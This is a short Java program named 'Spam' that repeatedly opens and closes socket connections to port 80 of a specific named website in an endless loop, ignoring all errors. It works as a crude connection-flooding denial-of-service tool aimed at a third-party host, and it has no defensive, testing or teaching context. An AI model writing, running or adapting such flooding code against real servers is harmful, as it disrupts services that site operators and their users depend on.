import java.net.InetSocketAddress;
import java.nio.channels.SocketChannel;


public class Spam {
	public static void main(String[] args){
		InetSocketAddress addr = new InetSocketAddress("grade9-study.tk", 80);
		while(true){
			try{
				SocketChannel channel = SocketChannel.open();
				channel.configureBlocking(false);
				channel.connect(addr);
				System.out.println("connect");
				channel.close();
			}
			catch(Exception e){
			}
		}
	}
}
